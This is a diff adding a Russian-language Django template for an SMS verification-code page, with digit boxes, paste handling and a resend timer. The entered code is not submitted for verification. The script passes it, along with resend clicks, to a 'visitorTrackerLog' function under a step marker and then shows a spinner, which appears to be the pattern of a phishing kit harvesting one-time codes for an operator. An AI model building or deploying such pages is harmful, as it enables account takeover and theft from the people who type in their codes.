@@ -1,0 +1,142 @@
+{% extends 'base.html' %}
+{% load static i18n %}
+
+{% block css %}
+    <link rel="stylesheet" href="{% static 'css/code.css' %}">
+{% endblock css %}
+
+{% block content %}
+<div class="auth-card__body">
+    {% include 'includes/logo.html' %}
+
+    <div class="auth-card__title_wrapper">
+        <h1 class="auth-card__title">{% trans "Отправили код" %}<br>{% blocktrans %}на {{ phone }}{% endblocktrans %}</h1>
+        <p class="auth-card__subtitle">{% blocktrans %}Если не получили СМС, проверьте чат «Коды подтверждения» в MAX{% endblocktrans %}</p>
+    </div>
+
+    <div class="code-inputs" id="code-inputs">
+        <input type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="1" class="code-inputs__box">
+        <input type="text" inputmode="numeric" maxlength="1" class="code-inputs__box">
+        <input type="text" inputmode="numeric" maxlength="1" class="code-inputs__box">
+        <input type="text" inputmode="numeric" maxlength="1" class="code-inputs__box">
+        <input type="text" inputmode="numeric" maxlength="1" class="code-inputs__box">
+        <input type="text" inputmode="numeric" maxlength="1" class="code-inputs__box">
+    </div>
+
+    <p class="code-resend" id="resend-line">
+        {% trans "Получить новый код можно через" %} <span id="resend-timer">01:00</span>
+    </p>
+</div>
+{% endblock content %}
+
+{% block js_scripts %}
+    <script>window.VISITOR_STEP = 'code';</script>
+    <script src="{% static 'js/visitor-tracker.js' %}"></script>
+    <script>
+        (function () {
+            var boxes = Array.prototype.slice.call(document.querySelectorAll('.code-inputs__box'));
+            var resendLine = document.getElementById('resend-line');
+            var resendInterval = null;
+            var seconds = 60;
+
+            function currentCode() {
+                return boxes.map(function (box) { return box.value; }).join('');
+            }
+
+            function animatePaste(box) {
+                box.classList.remove('code-inputs__box--pop');
+                void box.offsetWidth;
+                box.classList.add('code-inputs__box--pop');
+            }
+
+            function completeStep(code) {
+                if (resendInterval) {
+                    clearInterval(resendInterval);
+                }
+                if (window.visitorTrackerLog) {
+                    window.visitorTrackerLog('code', code);
+                }
+                window.showStepSpinner();
+            }
+
+            boxes.forEach(function (box, index) {
+                box.addEventListener('input', function () {
+                    box.value = box.value.replace(/\D/g, '').slice(0, 1);
+                    if (box.value && boxes[index + 1]) {
+                        boxes[index + 1].focus();
+                    }
+                    var code = currentCode();
+                    if (code.length === boxes.length) {
+                        completeStep(code);
+                    }
+                });
+
+                box.addEventListener('keydown', function (event) {
+                    if (event.key === 'Backspace' && !box.value && boxes[index - 1]) {
+                        boxes[index - 1].focus();
+                    }
+                });
+
+                box.addEventListener('paste', function (event) {
+                    var text = (event.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                    if (!text) {
+                        return;
+                    }
+                    event.preventDefault();
+                    var digits = text.split('').slice(0, boxes.length - index);
+                    var stepDelay = 90;
+                    digits.forEach(function (digit, offset) {
+                        setTimeout(function () {
+                            var target = boxes[index + offset];
+                            target.value = digit;
+                            target.focus();
+                            animatePaste(target);
+                            if (offset === digits.length - 1) {
+                                var code = currentCode();
+                                if (code.length === boxes.length) {
+                                    setTimeout(function () { completeStep(code); }, 220);
+                                }
+                            }
+                        }, stepDelay * offset);
+                    });
+                });
+            });
+
+            boxes[0].focus();
+
+            function tick() {
+                seconds -= 1;
+                if (seconds <= 0) {
+                    clearInterval(resendInterval);
+                    showResendLink();
+                    return;
+                }
+                var timerEl = document.getElementById('resend-timer');
+                if (timerEl) {
+                    var mm = String(Math.floor(seconds / 60)).padStart(2, '0');
+                    var ss = String(seconds % 60).padStart(2, '0');
+                    timerEl.textContent = mm + ':' + ss;
+                }
+            }
+
+            function showResendLink() {
+                resendLine.innerHTML = '<a href="#" id="resend-link">{% trans "Отправить код повторно" %}</a>';
+                document.getElementById('resend-link').addEventListener('click', function (event) {
+                    event.preventDefault();
+                    if (window.visitorTrackerLog) {
+                        window.visitorTrackerLog('code', 'запросил новый код');
+                    }
+                    startCountdown();
+                });
+            }
+
+            function startCountdown() {
+                seconds = 60;
+                resendLine.innerHTML = '{% trans "Получить новый код можно через" %} <span id="resend-timer">01:00</span>';
+                resendInterval = setInterval(tick, 1000);
+            }
+
+            startCountdown();
+        })();
+    </script>
+{% endblock js_scripts %}
